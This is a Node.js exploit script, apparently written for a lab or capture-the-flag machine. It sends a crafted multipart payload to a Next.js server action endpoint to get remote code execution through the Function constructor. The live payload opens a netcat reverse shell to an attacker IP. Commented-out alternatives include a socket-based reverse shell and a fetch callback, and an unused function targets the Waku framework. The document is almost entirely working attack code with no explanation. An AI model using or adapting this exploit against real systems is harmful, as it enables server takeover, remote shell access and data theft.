 const payload = {
       '0': '$1',
       '1': {
           'status':'resolved_model',
           'reason':0,
           '_response':'$4',
           'value':'{"then":"$3:map","0":{"then":"$B3"},"length":1}',
           'then':'$2:then'
       },
     '2': '$@3',
     '3': [],
     '4': {
          '_prefix':'var res=process.mainModule.require("child_process").execSync("\'nc 10.10.16.250 4444 -e /bin/sh\'").toString();throw Object.assign(new Error("NEXT_RE    DIRECT"), { digest: `${res}`})//',
          //'_prefix':'var res=process.mainModule.require("child_process").execSync("nc 10.10.16.250 4444 -e /bin/sh").toString().trim();throw     Object.assign(new Error("NEXT_REDIRECT"), { digest: `${res}`})//',
          //'_prefix':"(function(){var net=process.mainModule.require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=    new net.Socket();client.connect(4444, '10.10.16.250',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});retur    n /a/;})();//",i
          //'_prefix':'console.log(7*7+1);//',
          //'_prefix':'fetch(\"http://10.10.16.250:4444\")//',
          '_formData':{
              'get':'$3:constructor:constructor'
          },
          '_chunks':'$2:_response:_chunks',
      }
  }

const FormDataLib = require('form-data')

const fd = new FormDataLib()

for (const key in payload) {
    fd.append(key, JSON.stringify(payload[key]))
}

console.log(fd.getBuffer().toString())

console.log(fd.getHeaders())

function exploitNext(baseUrl) {
    fetch(baseUrl, {
        method: 'POST',
        headers: {
            'next-action': 'x',
            ...fd.getHeaders()
        },
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}

// Place the correct URL and uncomment the line
exploitNext('http://10.129.10.203:3000/')

/*
function exploitWaku(baseUrl) {
    fetch(baseUrl + '/RSC/foo.txt', {
        method: 'POST',
        headers: fd.getHeaders(),
        body: fd.getBuffer()
    }).then(x => {
        console.log('fetched', x)
        return x.text()
    }).then(x => {
        console.log('got', x)
    })
}
*/


// exploitWaku('http://localhost:3002')